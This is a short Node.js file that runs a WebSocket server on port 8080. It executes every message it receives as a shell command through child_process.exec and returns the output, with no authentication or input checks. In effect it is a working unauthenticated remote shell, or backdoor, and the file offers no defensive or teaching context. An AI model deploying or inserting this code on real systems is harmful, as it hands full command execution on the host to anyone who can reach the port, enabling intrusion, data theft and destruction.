const WebSocket = require('ws');
const { exec } = require('child_process');

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    exec(message, (err, stdout, stderr) => {
      if (err) {
        ws.send(`Error: ${err}`);
      } else if (stderr) {
        ws.send(`Stderr: ${stderr}`);
      } else {
        ws.send(`Stdout: ${stdout}`);
      }
    });
  });
});
